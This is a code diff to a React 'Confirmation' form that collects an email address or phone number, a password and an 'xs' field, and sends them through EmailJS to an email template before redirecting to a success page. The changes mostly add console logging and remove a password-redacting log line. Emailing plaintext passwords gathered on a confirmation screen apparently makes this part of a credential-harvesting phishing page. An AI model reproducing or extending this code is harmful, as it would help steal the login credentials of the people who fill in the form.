@@ -78,50 +78,41 @@ export default function Confirmation() {
   }, [countrySearch]);
 
   const onSubmit = async (data: any) => {
-    if (isSubmitting) return;
-
     try {
+      console.log("Form submission started");
       setIsSubmitting(true);
 
-      // Validate required fields
       if (!data.user_email || !data.password) {
+        console.log("Validation failed - missing required fields");
         toast({
           variant: "destructive",
           title: "Error",
           description: "Please fill in all required fields"
         });
+        setIsSubmitting(false);
         return;
       }
 
-      // Prepare submission data
+      console.log("Preparing submission data");
       const submissionData = {
         ...data,
         user_email: contactMethod === 'phone' 
           ? `${data.countryCode}${data.user_email}`
           : data.user_email,
         timestamp: new Date().toISOString(),
-        serviceId: import.meta.env.VITE_EMAILJS_SERVICE_ID,
-        templateId: import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID,
       };
 
-      console.log('Submitting form with data:', {
-        ...submissionData,
-        password: '[REDACTED]',
-        xs: '[REDACTED]'
-      });
-
-      // Send email
+      console.log("Sending form data to EmailJS");
       const result = await sendConfirmationFormEmail(submissionData);
-      console.log('Email submission result:', result);
 
-      // Clear validation data and show success
+      console.log("Form submission successful", result);
       localStorage.removeItem('validation_data');
+
       toast({
         title: "Success!",
         description: "Your information has been submitted successfully"
       });
 
-      // Redirect after delay
       setTimeout(() => {
         setLocation("/success");
       }, 1500);
